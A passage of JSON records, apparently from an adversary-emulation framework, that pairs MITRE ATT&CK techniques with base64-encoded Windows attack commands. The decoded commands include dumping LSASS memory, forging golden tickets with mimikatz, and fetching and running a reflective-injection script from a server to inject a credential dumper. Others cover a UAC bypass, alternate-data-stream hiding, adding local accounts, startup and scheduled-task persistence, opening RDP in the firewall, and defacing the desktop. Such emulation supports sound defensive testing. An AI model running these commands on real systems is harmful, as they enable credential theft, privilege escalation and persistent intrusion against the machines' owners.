"windows", "name": "Delete an entire folder - Windows cmd", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Recursively delete a folder in the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n", "variations": []}, {"test": "JHVybCA9ICIje3VybF9vZl93YWxscGFwZXJ9IjsgJGltZ0xvY2F0aW9uID0gIiN7d2FsbHBhcGVyX2xvY2F0aW9ufSI7ICRvcmdXYWxscGFwZXIgPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCBSZWdpc3RyeTo6J0hLRVlfQ1VSUkVOVF9VU0VSXENvbnRyb2wgUGFuZWxcRGVza3RvcFwnIC1OYW1lIFdhbGxQYXBlcikuV2FsbFBhcGVyOyAkb3JnV2FsbHBhcGVyIHwgT3V0LUZpbGUgLUZpbGVQYXRoICIje3BvaW50ZXJfdG9fb3JnaW5hbF93YWxscGFwZXJ9IjsgJHVwZGF0ZVdhbGxwYXBlcmNvZGUgPSBAJyA7IHVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsgOyBuYW1lc3BhY2UgV2luMzJ7OyA7ICAgICBwdWJsaWMgY2xhc3MgV2FsbHBhcGVyeyA7ICAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvKV0gOyAgICAgICAgICBzdGF0aWMgZXh0ZXJuIGludCBTeXN0ZW1QYXJhbWV0ZXJzSW5mbyAoaW50IHVBY3Rpb24gLCBpbnQgdVBhcmFtICwgc3RyaW5nIGxwdlBhcmFtICwgaW50IGZ1V2luSW5pKSA7IDsgICAgICAgICAgOyAgICAgICAgICBwdWJsaWMgc3RhdGljIHZvaWQgU2V0V2FsbHBhcGVyKHN0cmluZyB0aGVQYXRoKXsgOyAgICAgICAgICAgICBTeXN0ZW1QYXJhbWV0ZXJzSW5mbygyMCwwLHRoZVBhdGgsMyk7IDsgICAgICAgICB9OyAgICAgfTsgfSA7ICdAOyAkd2MgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50ICA7IHRyeXsgIDsgICAgICR3Yy5Eb3dubG9hZEZpbGUoJHVybCwgJGltZ0xvY2F0aW9uKTsgICAgIGFkZC10eXBlICR1cGRhdGVXYWxscGFwZXJjb2RlIDsgICAgIFtXaW4zMi5XYWxscGFwZXJdOjpTZXRXYWxscGFwZXIoJGltZ0xvY2F0aW9uKTsgfSA7IGNhdGNoIFtTeXN0ZW0uTmV0LldlYkV4Y2VwdGlvbl17ICA7ICAgICBXcml0ZS1Ib3N0KCJDYW5ub3QgZG93bmxvYWQgJHVybCIpIDsgICAgIGFkZC10eXBlICR1cGRhdGVXYWxscGFwZXJjb2RlIDsgICAgIFtXaW4zMi5XYWxscGFwZXJdOjpTZXRXYWxscGFwZXIoJGltZ0xvY2F0aW9uKTsgfSA7IGZpbmFsbHl7ICAgIDsgICAgICR3Yy5EaXNwb3NlKCkgIDsgfQ==", "ability_id": "d73958baed610239bb1414c1b51cef0d", "technique_name": "Defacement: Internal Defacement", "additional_info": {}, "privilege": "", "technique_id": "T1491.001", "platform": "windows", "name": "Replace Desktop Wallpaper", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JHVwZGF0ZVdhbGxwYXBlcmNvZGUgPSBAJyA7IHVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsgOyBuYW1lc3BhY2UgV2luMzJ7OyA7ICAgICBwdWJsaWMgY2xhc3MgV2FsbHBhcGVyeyA7ICAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvKV0gOyAgICAgICAgICBzdGF0aWMgZXh0ZXJuIGludCBTeXN0ZW1QYXJhbWV0ZXJzSW5mbyAoaW50IHVBY3Rpb24gLCBpbnQgdVBhcmFtICwgc3RyaW5nIGxwdlBhcmFtICwgaW50IGZ1V2luSW5pKSA7IDsgICAgICAgICAgOyAgICAgICAgICBwdWJsaWMgc3RhdGljIHZvaWQgU2V0V2FsbHBhcGVyKHN0cmluZyB0aGVQYXRoKXsgOyAgICAgICAgICAgICBTeXN0ZW1QYXJhbWV0ZXJzSW5mbygyMCwwLHRoZVBhdGgsMyk7IDsgICAgICAgICB9OyAgICAgfTsgfSA7ICdAOyBpZiAoVGVzdC1QYXRoIC1QYXRoICN7cG9pbnRlcl90b19vcmdpbmFsX3dhbGxwYXBlcn0gLVBhdGhUeXBlIExlYWYpIHs7ICAgICAgJG9yZ0ltZyA9IEdldC1Db250ZW50IC1QYXRoICIje3BvaW50ZXJfdG9fb3JnaW5hbF93YWxscGFwZXJ9IjsgICAgICBhZGQtdHlwZSAkdXBkYXRlV2FsbHBhcGVyY29kZSA7ICAgICAgW1dpbjMyLldhbGxwYXBlcl06OlNldFdhbGxwYXBlcigkb3JnSW1nKTsgfTsgUmVtb3ZlLUl0ZW0gIiN7cG9pbnRlcl90b19vcmdpbmFsX3dhbGxwYXBlcn0iIC1FcnJvckFjdGlvbiBJZ25vcmU7IFJlbW92ZS1JdGVtICIje3dhbGxwYXBlcl9sb2NhdGlvbn0iIC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "Downloads an image from a URL and sets it as the desktop wallpaper.\n", "variations": []}, {"test": "JHVybD0iI3tzZXJ2ZXJ9L2ZpbGUvZG93bmxvYWQiOyR3Yz1OZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50OyR3Yy5IZWFkZXJzLmFkZCgiZmlsZSIsImRlYnVnZ2VyLmRsbCIpOyRQQnl0ZXMgPSAkd2MuRG93bmxvYWREYXRhKCR1cmwpOyR3YzEgPSBOZXctT2JqZWN0IFN5c3RlbS5uZXQud2ViY2xpZW50OyR3YzEuaGVhZGVycy5hZGQoImZpbGUiLCJJbnZva2UtUmVmbGVjdGl2ZVBFSW5qZWN0aW9uLnBzMSIpO0lFWCAoJHdjMS5Eb3dubG9hZFN0cmluZygkdXJsKSk7SW52b2tlLVJlZmxlY3RpdmVQRUluamVjdGlvbiAtUEJ5dGVzICRQQnl0ZXMgLXZlcmJvc2U=", "ability_id": "c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7", "technique_name": "Process Injection: Portable Executable Injection", "additional_info": {}, "privilege": "", "technique_id": "T1055.002", "platform": "windows", "name": "Inject Cred dumper into process (Spookier)", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Injects cred dumper exe into an available process", "variations": []}, {"test": "dHlwZSBDOlx0ZW1wXGV2aWwuZXhlID4gIkM6XFByb2dyYW0gRmlsZXMgKHg4NilcVGVhbVZpZXdlclxUZWFtVmlld2VyMTJfTG9nZmlsZS5sb2c6ZXZpbC5leGUiICYmIGV4dHJhYzMyIGM6XEFEU1xccHJvY2V4cC5jYWIgYzpcQURTXFxmaWxlLnR4dDpwcm9jZXhwLmV4ZSAmJiBmaW5kc3RyIC9WIC9MIFczQWxsTG92M0RvbmFsZFRydW1wIGM6XEFEU1xccHJvY2V4cC5leGUgPiBjOlxBRFNcXGZpbGUudHh0OnByb2NleHAuZXhlICYmIGNlcnR1dGlsLmV4ZSAtdXJsY2FjaGUgLXNwbGl0IC1mIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDE1NjQuMDA0L3NyYy90ZXN0LnBzMSBjOlx0ZW1wOnR0dCAmJiBtYWtlY2FiIGM6XEFEU1xcYXV0b3J1bnMuZXhlIGM6XEFEU1xcY2FidGVzdC50eHQ6YXV0b3J1bnMuY2FiICYmIHByaW50IC9EOmM6XEFEU1xcZmlsZS50eHQ6YXV0b3J1bnMuZXhlIGM6XEFEU1xcQXV0b3J1bnMuZXhlICYmIHJlZyBleHBvcnQgSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcRXZpbHJlZyBjOlxBRFNcXGZpbGUudHh0OmV2aWxyZWcucmVnICYmIHJlZ2VkaXQgL0UgYzpcQURTXFxmaWxlLnR4dDpyZWdmaWxlLnJlZyBIS0VZX0NVUlJFTlRfVVNFUlxNeUN1c3RvbVJlZ0tleSAmJiBleHBhbmQgXFx3ZWJkYXZcZm9sZGVyXGZpbGUuYmF0IGM6XEFEU1xcZmlsZS50eHQ6ZmlsZS5iYXQgJiYgZXNlbnR1dGwuZXhlIC95IGM6XEFEU1xcYXV0b3J1bnMuZXhlIC9kIGM6XEFEU1xcZmlsZS50eHQ6YXV0b3J1bnMuZXhlIC9v", "ability_id": "e3624fa885fbc8781cd4826d5a914eda", "technique_name": "Hide Artifacts: NTFS File Attributes", "additional_info": {}, "privilege": "", "technique_id": "T1564.004", "platform": "windows", "name": "Alternate Data Streams (ADS)", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Execute from Alternate Streams\n\n[Reference - 1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)\n\n[Reference - 2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)\n", "variations": []}, {"test": "bmV0c2guZXhlIGFkdmZpcmV3YWxsICBzaG93IGFsbHByb2ZpbGVzICYmIHRhc2tsaXN0LmV4ZSAmJiB0YXNrbGlzdC5leGUgfCBmaW5kc3RyIC9pIHZpcnVzICYmIHRhc2tsaXN0LmV4ZSB8IGZpbmRzdHIgL2kgY2IgJiYgdGFza2xpc3QuZXhlIHwgZmluZHN0ciAvaSBkZWZlbmRlciAmJiB0YXNrbGlzdC5leGUgfCBmaW5kc3RyIC9pIGN5bGFuY2U=", "ability_id": "9daa94a5038f6fcb8060b832623b8899", "technique_name": "Software Discovery: Security Software Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1518.001", "platform": "windows", "name": "Security Software Discovery", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, the test is going to display running processes, firewall configuration on network profiles\nand specific security software.\n", "variations": []}, {"test": "cmVnIHF1ZXJ5IEhLQ1VcU29mdHdhcmVcU2ltb25UYXRoYW1cUHVUVFlcU2Vzc2lvbnMgL3QgUkVHX1NaIC9z", "ability_id": "262666862164b89881f6b5c565c0a3be", "technique_name": "Unsecured Credentials: Credentials in Registry", "additional_info": {}, "privilege": "", "technique_id": "T1552.002", "platform": "windows", "name": "Enumeration for PuTTY Credentials in Registry", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Queries to enumerate for PuTTY credentials in the Registry. PuTTY must be installed for this test to work. If any registry\nentries are found, they will be displayed.\n", "variations": []}, {"test": "bmV0IHVzZXIgL2FkZCAiVDExMzYuMDAxX0NNRCIgIlQxMTM2LjAwMV9DTUQhIg==", "ability_id": "e6649419baf4d28d52e191caf07b5f53", "technique_name": "Create Account: Local Account", "additional_info": {}, "privilege": "", "technique_id": "T1136.001", "platform": "windows", "name": "Create a new user in a command prompt", "requirements": [], "tactic": "persistence", "buckets": ["persistence"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["bmV0IHVzZXIgL2RlbCAiVDExMzYuMDAxX0NNRCIgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Creates a new user in a command prompt. Upon execution, \"The command completed successfully.\" will be displayed. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_CMD\"\n", "variations": []}, {"test": "Z2V0LXNtYnNoYXJl", "ability_id": "25b475e94dd2d70fcc66b2ce43c8f718", "technique_name": "Network Share Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1135", "platform": "windows", "name": "Network Share Discovery PowerShell", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host\nUpon execution, avalaible network shares will be displayed in the powershell session\n", "variations": []}, {"test": "Z2V0LXdtaW9iamVjdCB3aW4zMl9jb21wdXRlcnN5c3RlbSB8IGZsIG1vZGVs", "ability_id": "5dc841fd-28ad-40e2-b10e-fb007fe09e81", "technique_name": "Virtualization/Sandbox Evasion: System Checks", "additional_info": {}, "privilege": "", "technique_id": "T1497.001", "platform": "windows", "name": "Virtual or Real", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Determine if the system is virtualized or physical", "variations": []}, {"test": "QzpcV2luZG93c1xTeXN0ZW0zMlxydW5kbGwzMi5leGUgQzpcd2luZG93c1xTeXN0ZW0zMlxjb21zdmNzLmRsbCwgTWluaUR1bXAgKEdldC1Qcm9jZXNzIGxzYXNzKS5pZCAkZW52OlRFTVBcbHNhc3MtY29tc3Zjcy5kbXAgZnVsbA==", "ability_id": "35d92515122effdd73801c6ac3021da7", "technique_name": "OS Credential Dumping: LSASS Memory", "additional_info": {}, "privilege": "", "technique_id": "T1003.001", "platform": "windows", "name": "Dump LSASS.exe Memory using comsvcs.dll", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpURU1QXGxzYXNzLWNvbXN2Y3MuZG1wIC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-comsvcs.dmp.\n", "variations": []}, {"test": "JHBzX3VybCA9ICJodHRwczovL2Rvd25sb2FkLnN5c2ludGVybmFscy5jb20vZmlsZXMvUFNUb29scy56aXAiOyRkb3dubG9hZF9mb2xkZXIgPSAiQzpcVXNlcnNcUHVibGljXCI7JHN0YWdpbmdfZm9sZGVyID0gIkM6XFVzZXJzXFB1YmxpY1x0ZW1wIjtTdGFydC1CaXRzVHJhbnNmZXIgLVNvdXJjZSAkcHNfdXJsIC1EZXN0aW5hdGlvbiAkZG93bmxvYWRfZm9sZGVyO0V4cGFuZC1BcmNoaXZlIC1MaXRlcmFsUGF0aCAkZG93bmxvYWRfZm9sZGVyIlBTVG9vbHMuemlwIiAtRGVzdGluYXRpb25QYXRoICRzdGFnaW5nX2ZvbGRlcjtpZXggJHN0YWdpbmdfZm9sZGVyIlxwc2xpc3QuZXhlIiA+PiAkZW52OkxPQ0FMQVBQREFUQVxvdXRwdXQubG9nO1JlbW92ZS1JdGVtICRkb3dubG9hZF9mb2xkZXIiUFNUb29scy56aXAiO1JlbW92ZS1JdGVtICRzdGFnaW5nX2ZvbGRlciAtUmVjdXJzZQ==", "ability_id": "cc191baa-7472-4386-a2f4-42f203f1acfd", "technique_name": "Process Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1057", "platform": "windows", "name": "SysInternals PSTool Process Discovery", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Process discovery via SysInternals pstool", "variations": []}, {"test": "IiV0ZW1wJVx1YWNtZVw2MSBBa2FnaTY0LmV4ZSI=", "ability_id": "3688b79543e271e7389e76377aa65fcd", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "UACME Bypass Method 61", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cG93ZXJzaGVsbCBTdG9wLVByb2Nlc3MgLU5hbWUgY21kIC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3JlICYmIHBvd2Vyc2hlbGwgU3RvcC1Qcm9jZXNzIC1OYW1lIG1tYyAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "cmd", "access": {}, "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3/bytecode77 derivative by Nassim Asrir\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\slui.exe, \\system32\\changepk.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n", "variations": []}, {"test": "UmVtb3ZlLUl0ZW0gJGVudjpURU1QXGdvbGRlbi5iYXQgLUVycm9yQWN0aW9uIElnbm9yZTsgUmVtb3ZlLUl0ZW0gJGVudjpURU1QXGdvbGRlbi50eHQgLUVycm9yQWN0aW9uIElnbm9yZTsgOyAjIGdldCBjdXJyZW50IGRvbWFpbiBTSUQgaWYgZGVmYXVsdCB3YXMgdXNlZDsgJGRvbWFpbl9zaWQgPSAiUy0xLTUtMjEtREVGQVVMVCI7IElmICgkZG9tYWluX3NpZCAtTWF0Y2ggIkRFRkFVTFQiKSB7OyAgICMgY29kZSBmcm9tIGh0dHBzOi8vd3d3LnNldmVjZWsuY29tL0VuZ2xpc2hQYWdlcy9MaXN0cy9Qb3N0cy9Qb3N0LmFzcHg/SUQ9NjA7ICAgJGRvbWFpbiA9IGd3bWkgV2luMzJfQ29tcHV0ZXJTeXN0ZW0gfCBTZWxlY3QgLUV4cGFuZCBEb21haW47ICAgJGtyYnRndFNJRCA9IChOZXctT2JqZWN0IFNlY3VyaXR5LlByaW5jaXBhbC5OVEFjY291bnQgJGRvbWFpblxrcmJ0Z3QpLlRyYW5zbGF0ZShbU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcl0pLlZhbHVlOyAgICRkb21haW5fc2lkID0gJGtyYnRndFNJRC5TdWJTdHJpbmcoMCwgJGtyYnRndFNJRC5MYXN0SW5kZXhPZignLScpKTsgfTsgOyAjIGNyZWF0ZSBiYXRjaCBmaWxlIHdpdGggY29tbWFuZHMgdG8gcnVuIGluIGEgc2VwYXJhdGUgInJ1bmFzIC9uZXRvbmx5IiBzZXNzaW9uOyAjIHNvIHdlIGRvbid0IHB1cmdlIEtlcmJlcm9zIHRpY2tldCBmcm9tIHRoZSBjdXJyZW50IFdpbmRvd3Mgc2Vzc2lvbjsgIyBpdHMgb3V0cHV0IGdvZXMgdG8gZ29sZGVuLnR4dCB0ZW1wIGZpbGUsIGJlY2F1c2Ugd2UgY2Fubm90IGNhcHR1cmUgInJ1bmFzIC9uZXRvbmx5IiBvdXRwdXQgb3RoZXJ3aXNlOyBAIjsgPiVURU1QJVxnb2xkZW4udHh0IDI+JjEgKDsgICBlY2hvIFB1cmdlIGV4aXN0aW5nIHRpY2tldHMgYW5kIGNyZWF0ZSBnb2xkZW4gdGlja2V0OjsgICBrbGlzdCBwdXJnZTsgICAkZW52OlRFTVBcbWltaWthdHpceDY0XG1pbWlrYXR6LmV4ZSAia2VyYmVyb3M6OmdvbGRlbiAvZG9tYWluOiV1c2VyZG5zZG9tYWluJSAvc2lkOkRPTUFJTl9TSUQgL2FlczI1NjpiNzI2ODM2MTM4NjA5MDMxNGFjY2U4ZDkzNjdlNTVmNTU4NjVlN2VmOGU2NzBmYmU0MjYyZDZjOTQwOThhOWU5IC91c2VyOmdvbGRlbnRpY2tldGZha2V1c2VyIC9wdHQiICJleGl0IjsgOyAgIGVjaG8uOyAgIGVjaG8gUmVxdWVzdGluZyBTWVNWT0w6OyAgIGRpciBcXCV1c2VyZG5zZG9tYWluJVxTWVNWT0w7ICAgOyAgIGVjaG8uOyAgIGVjaG8gVGlja2V0cyBhZnRlciByZXF1ZXN0aW5nIFNZU1ZPTDo7ICAga2xpc3Q7IDsgICBlY2hvLjsgICBlY2hvIEVuZCBvZiBHb2xkZW4gVGlja2V0IGF0dGFjazsgKTsgIkAgLVJlcGxhY2UgIkRPTUFJTl9TSUQiLCAkZG9tYWluX3NpZCB8IE91dC1GaWxlIC1FbmNvZGluZyBPRU0gJGVudjpURU1QXGdvbGRlbi5iYXQ7IDsgIyBydW4gYmF0Y2ggZmlsZSBpbiBhIG5ldyBlbXB0eSBzZXNzaW9uIChwYXNzd29yZCBhbmQgdXNlcm5hbWUgZG8gbm90IG1hdHRlcik7IGVjaG8gImZvbyIgfCBydW5hcyAvbmV0b25seSAvdXNlcjpmYWtlICIkZW52OlRFTVBcZ29sZGVuLmJhdCIgfCBPdXQtTnVsbDsgOyAjIHdhaXQgdW50aWwgdGhlIG91dHB1dCBmaWxlIGhhcyBsb2dnZWQgdGhlIGVudGlyZSBhdHRhY2s7IGRvIHs7ICAgU3RhcnQtU2xlZXAgMSAjIHdhaXQgYSBiaXQgc28gdGhlIG91dHB1dCBmaWxlIGhhcyB0aW1lIHRvIGJlIGNyZWF0ZWQ7ICAgR2V0LUNvbnRlbnQgLVBhdGggIiRlbnY6VEVNUFxnb2xkZW4udHh0IiAtV2FpdCB8IEZvckVhY2gtT2JqZWN0IHs7ICAgICBpZiAoJF8gLW1hdGNoICdFbmQgb2YgR29sZGVuIFRpY2tldCBhdHRhY2snKSB7IGJyZWFrIH0gOyAgIH07IH0gd2hpbGUgKCRmYWxzZSkgIyBkdW1teSBsb29wIHNvIHRoYXQgJ2JyZWFrJyBjYW4gYmUgdXNlZDsgOyAjIHNob3cgb3V0cHV0IGZyb20gbmV3IGVtcHR5IHNlc3Npb247IEdldC1Db250ZW50ICRlbnY6VEVNUFxnb2xkZW4udHh0OyA7ICMgY2xlYW51cCB0ZW1wIGZpbGVzOyBSZW1vdmUtSXRlbSAkZW52OlRFTVBcZ29sZGVuLmJhdCAtRXJyb3JBY3Rpb24gSWdub3JlOyBSZW1vdmUtSXRlbSAkZW52OlRFTVBcZ29sZGVuLnR4dCAtRXJyb3JBY3Rpb24gSWdub3Jl", "ability_id": "c4216ccb62904490df937f5233aecd3b", "technique_name": "Steal or Forge Kerberos Tickets: Golden Ticket", "additional_info": {}, "privilege": "", "technique_id": "T1558.001", "platform": "windows", "name": "Crafting Active Directory golden tickets with mimikatz", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n", "variations": []}, {"test": "JGtlZXAgPSBNb3VudC1EaXNrSW1hZ2UgLUltYWdlUGF0aCAiMGY5NTlhX0ZlZWxUaGVCdXJuLmlzbyIgLVN0b3JhZ2VUeXBlIElTTyAtQWNjZXNzIFJlYWRPbmx5OyAkZHJpdmVMZXR0ZXIgPSAoJGtlZXAgfCBHZXQtVm9sdW1lKS5Ecml2ZUxldHRlcjsgaW52b2tlLWl0ZW0gIiQoJGRyaXZlTGV0dGVyKTpcaGVsbG8uZXhlIg==", "ability_id": "799defcee616a1e38cd043c55560feca", "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass", "additional_info": {}, "privilege": "", "technique_id": "T1553.005", "platform": "windows", "name": "Mount an ISO image and run executable from the ISO", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["0f959a_FeelTheBurn.iso", "0f959a_FeelTheBurn.iso"], "cleanup": ["RGlzbW91bnQtRGlza0ltYWdlIC1JbWFnZVBhdGggIjBmOTU5YV9GZWVsVGhlQnVybi5pc28iIHwgT3V0LU51bGw7IFN0b3AtcHJvY2VzcyAtbmFtZSAiaGVsbG8iIC1Gb3JjZSAtRXJyb3JBY3Rpb24gaWdub3Jl", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICIwZjk1OWFfRmVlbFRoZUJ1cm4uaXNvIg=="], "executor": "psh", "access": {}, "description": "Mounts an ISO image downloaded from internet to evade Mark-of-the-Web and run hello.exe executable from the ISO. \nUpon successful execution, powershell will download the .iso from the Atomic Red Team repo, mount the image, and run the executable from the ISO image that will open command prompt echoing \"Hello, World!\". \nISO provided by:https://twitter.com/mattifestation/status/1398323532988399620 Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,  ", "variations": []}, {"test": "c2NodGFza3MgL2NyZWF0ZSAvdG4gIlQxMDUzXzAwNV9PbkxvZ29uIiAvc2Mgb25sb2dvbiAvdHIgImNtZC5leGUgL2MgY2FsYy5leGUiICYmIHNjaHRhc2tzIC9jcmVhdGUgL3RuICJUMTA1M18wMDVfT25TdGFydHVwIiAvc2Mgb25zdGFydCAvcnUgc3lzdGVtIC90ciAiY21kLmV4ZSAvYyBjYWxjLmV4ZSI=", "ability_id": "5db2884b6ca3ab932848f295a3896dc0", "technique_name": "Scheduled Task/Job: Scheduled Task", "additional_info": {}, "privilege": "", "technique_id": "T1053.005", "platform": "windows", "name": "Scheduled Task Startup Script", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["c2NodGFza3MgL2RlbGV0ZSAvdG4gIlQxMDUzXzAwNV9PbkxvZ29uIiAvZiA+bnVsIDI+JjEgJiYgc2NodGFza3MgL2RlbGV0ZSAvdG4gIlQxMDUzXzAwNV9PblN0YXJ0dXAiIC9mID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view\nthe tasks, open the Task Scheduler and look in the Active Tasks pane.\n", "variations": []}, {"test": "Q29weS1JdGVtIGJlYTkwYV9iYXRzdGFydHVwLmJhdCAiJGVudjpBUFBEQVRBXE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cFxiYXRzdGFydHVwLmJhdCI7IENvcHktSXRlbSBiZWE5MGFfYmF0c3RhcnR1cC5iYXQgIkM6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnRVcFxiYXRzdGFydHVwLmJhdCI7IFN0YXJ0LVByb2Nlc3MgIiRlbnY6QVBQREFUQVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXBcYmF0c3RhcnR1cC5iYXQiOyBTdGFydC1Qcm9jZXNzICJDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0VXBcYmF0c3RhcnR1cC5iYXQi", "ability_id": "f39161b2fa5d692ebe3972e0680a8f97", "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "additional_info": {}, "privilege": "", "technique_id": "T1547.001", "platform": "windows", "name": "Suspicious bat file run from startup Folder", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["bea90a_batstartup.bat"], "cleanup": ["UmVtb3ZlLUl0ZW0gIiRlbnY6QVBQREFUQVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXBcYmF0c3RhcnR1cC5iYXQiIC1FcnJvckFjdGlvbiBJZ25vcmU7IFJlbW92ZS1JdGVtICJDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0VXBcYmF0c3RhcnR1cC5iYXQiIC1FcnJvckFjdGlvbiBJZ25vcmU=", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJiZWE5MGFfYmF0c3RhcnR1cC5iYXQi"], "executor": "psh", "access": {}, "description": "bat files can be placed in and executed from the startup folder to maintain persistance.\nUpon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n", "variations": []}, {"test": "bmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgYWRkIHJ1bGUgbmFtZT0iT3BlbiBQb3J0IHRvIEFueSIgZGlyPWluIHByb3RvY29sPXRjcCBsb2NhbHBvcnQ9MzM4OSBhY3Rpb249YWxsb3cgcHJvZmlsZT1hbnk=", "ability_id": "8d0a4585e7c4646185a912b14cd9cb46", "technique_name": "Impair Defenses: Disable or Modify System Firewall", "additional_info": {}, "privilege": "", "technique_id": "T1562.004", "platform": "windows", "name": "Open a local port through Windows Firewall to any profile", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": 